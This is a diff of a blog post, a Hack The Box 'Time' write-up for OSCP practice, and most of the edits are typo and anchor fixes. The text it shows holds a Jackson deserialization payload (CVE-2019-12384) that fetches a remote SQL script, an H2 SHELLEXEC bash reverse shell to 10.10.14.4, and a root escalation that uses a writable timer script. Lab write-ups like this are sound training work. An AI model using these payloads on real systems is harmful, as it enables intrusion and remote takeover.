@@ -7,11 +7,11 @@ tags: ["Hack The Box","OSCP"]
 {% assign imgDir="HTB-Time-Writeup" %}
 
 # Introduction
-The hack the box machine "Time" is a medium machine which is included in [TJnull's OSCP Preparation List](https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=1839402159). Exploiting this machine requires knowledge about deserialization attacks, systemd timers and Linux file permissions. The most challenge part is, however, to locate the right CVE since there aren't many good indicators for which CVE:s that would work on the target.
+The hack the box machine "Time" is a medium machine which is included in [TJnull's OSCP Preparation List](https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=1839402159). Exploiting this machine requires knowledge about deserialization attacks, systemd timers and Linux file permissions. The most challenge part is, however, to locate the right CVE for the initial foothold, since there aren't many good indicators for which CVE:s that would work on the target.
 
 <img style="Width:550px;" src="/assets/{{ imgDir }}/card.png" alt="HTBCard">
 
-By enumerating the target, it is possible to discover a web application on port 80. This web application can beautify and validate JSON data. By requesting the validation of some JSON data, it is possible to trigger an exception in the backend which discloses that the Java library [Jackson](https://github.com/FasterXML/jackson) is used to deserialize the JSON data. It is then possible to use [CVE-2019-12384](https://nvd.nist.gov/vuln/detail/CVE-2019-12384) to get a shell on the target. Thereafter, the privilege escalation can be formed by modifying a script which is executed as `root` every 10 seconds using a systemd timer.
+By enumerating the target, it is possible to discover a web application on port 80. This web application can beautify and validate JSON data. By requesting the validation of some JSON data, it is possible to trigger an exception in the backend which discloses that the Java library [Jackson](https://github.com/FasterXML/jackson) is used to deserialize submitted JSON data. It is then possible to use [CVE-2019-12384](https://nvd.nist.gov/vuln/detail/CVE-2019-12384) to get a shell on the target. Thereafter, the privilege escalation can be performed by modifying a script which is executed as `root` every 10 seconds using a systemd timer.
 
 <!-- Check if "beautify" is vulnerable to the CVE-->
 
@@ -36,8 +36,9 @@ If we send a request to validate some JSON data such as `{"key":"value"}`, we re
 Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token (START_OBJECT), expected START_ARRAY: need JSON Array to contain As.WRAPPER_ARRAY type information for class java.lang.Object
 {% endhighlight %}
 
-After some googling, it is possible to find [a couple of CVE:s](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=jackson) for the Jackson library. One of the CVE:s which can be identified is [CVE-2019-12384](https://nvd.nist.gov/vuln/detail/CVE-2019-12384). When searching for more information about this vulnerability, it is possible to find a [blog post](https://blog.doyensec.com/2019/07/22/jackson-gadgets.html) explaining how to exploit the vulnerability. In the blog post, the authors explain that the CVE enables the execution of arbitrary SQL statements when the Jackson library deserializes and then re-serialize the JSON object below.
+After some googling, it is possible to find [a couple of CVE:s](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=jackson) for the Jackson library. One of the CVE:s which can be identified is [CVE-2019-12384](https://nvd.nist.gov/vuln/detail/CVE-2019-12384). When searching for more information about this vulnerability, it is possible to find a [blog post](https://blog.doyensec.com/2019/07/22/jackson-gadgets.html) explaining how to exploit the vulnerability. In the blog post, the authors explain that the CVE enables the execution of arbitrary SQL statements when the Jackson library deserializes and then re-serializes the JSON object below.
 
+<div id="malicious-JSON-object"></div>
 {% highlight JSON linenos %}
 ["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost:8000/inject.sql'"}]
 {% endhighlight %}
@@ -82,14 +83,14 @@ $$;
 CALL SHELLEXEC('ping -c 10 10.10.14.4')
 {% endhighlight %}
 
-We place the content above in a file named "inject.sql". Then, we start a python web server in the directory where we saved this file by executing  `python3 -m http.server 80` and start Wireshark by executing `wireshark`. We then substitute `localhost:8000` for our IP `10.10.14.4` in the malicious JSON object seen earlier, paste it into the validation form and press "PROCESS".
+We place the content above in a file named "inject.sql". Then, we start a python web server in the directory where we saved this file by executing  `python3 -m http.server 80` and start Wireshark by executing `wireshark`. We then substitute `localhost:8000` for our IP `10.10.14.4` in the malicious JSON object [seen earlier]({{path}}#malicious-JSON-object), paste it into the validation form and press "PROCESS".
 
-<div id="malicious-JSON"></div>
+<div id="malicious-JSON-send"></div>
 ![sendSSRFPayload](/assets/{{ imgDir }}/sendSSRFPayload.png)
 
 ![webServer](/assets/{{ imgDir }}/webServer.png)
 
-After a couple of seconds, the target hosts requests the `inject.sql` file from the python web server and we can see ICMP packets being sent to us from the target.
+After a couple of seconds, the target host requests the `inject.sql` file from the python web server and we can see ICMP packets being sent to us from the target.
 
 ![wireshark](/assets/{{ imgDir }}/wireshark.png)
 
@@ -106,14 +107,14 @@ CALL SHELLEXEC('bash -i >& /dev/tcp/10.10.14.4/443 0>&1')
 
 ![shell](/assets/{{ imgDir }}/shell.png)
 
-Next, we start a netcat listener by executing `nc -lvnp 443` and resend [the request]({{path}}#malicious-JSON) which contained our malicious JSON object. After a couple of seconds, the listener receives a connection and we obtain a shell on the target!
+Next, we start a netcat listener by executing `nc -lvnp 443` and resend [the request]({{path}}#malicious-JSON-send) which contained our malicious JSON object. After a couple of seconds, the listener receives a connection and we obtain a shell on the target!
 
 # Privilege Escalation
 When enumerating a target for privilege escalation possiblities, it is common to check for cron jobs. These are configurations which define at what times, dates or intervals to execute certain tasks. When searching for scheduled tasks, it is important to not only stop at cron jobs but to also investigate systemd timers. 
 
-Systemd timers are similar to cron jobs in the sense that their main purpose is to run tasks at a specific point in time. A key difference, however, is that systemd timers are more complex and offer a greater flexibility. For example, each timer corresponds to a systemd service which represents the task that the systemd timer executes when triggered.
+Systemd timers are similar to cron jobs in the sense that their main purpose is to run tasks at a specific point in time. A key difference, however, is that systemd timers are more complex and offer greater flexibility. For example, each timer corresponds to a systemd service which represents the task that the systemd timer executes when triggered.
 
-In addition, systemd timers can be enabled or disabled with the prefix `systemctl enable/disable` and be started or stopped with the prefix `systemtl start/stop`. Apart from this, systemd timers can also be triggered on more complex conditions than cron jobs. For example, it is possible for a systemd timer to execute its corresponding service a couple of minutes after boot or when a device is plugged into a USB port. 
+In addition, systemd timers can be enabled or disabled with the prefix `systemctl enable/disable` and be started or stopped with the prefix `systemctl start/stop`. Apart from this, systemd timers can also be triggered on more complex conditions than cron jobs. For example, it is possible for a systemd timer to execute its corresponding service a couple of minutes after boot or when a device is plugged into a USB port. 
 
 ![timers](/assets/{{ imgDir }}/timers.png)
 
@@ -143,7 +144,7 @@ ExecStart=/bin/bash /usr/bin/timer_backup.sh
 
 ![timerBackup](/assets/{{ imgDir }}/timerBackup.png)
 
-If we check the file permissions of the script by executing `ls -l /usr/bin/timer_backup.sh`, we can see that we are actually the owner of the file. This means that we can change its content. At this point, we could add our reverse shell payload to the file to get a shell as `root`. However, the shell would only be working for 10 seconds since the process is restarted every 10 seconds. A better solution is to configure SSH for the `root` user so that we can obtain a `root` shell by connecting to the target over SSH. To do this, we start by executing `ssh-keygen -f ./id_rsa` to generate a RSA key pair. We use the `-f` flag to specify that the generated private and public key should be saved in the current directory.
+If we check the file permissions of the script by executing `ls -l /usr/bin/timer_backup.sh`, we can see that we are actually the owner of the file. This means that we can change its content. At this point, we could add our reverse shell payload to the file to get a shell as `root`. However, the shell would only be working for 10 seconds since the process is restarted every 10 seconds. A better solution is to configure SSH for the `root` user so that we can obtain a `root` shell by connecting to the target over SSH. To do this, we start by executing `ssh-keygen -f ./id_rsa` to generate an RSA key pair. We use the `-f` flag to specify that the generated private and public key should be saved in the current directory.
 
 ![keygen](/assets/{{ imgDir }}/keygen.png)
 
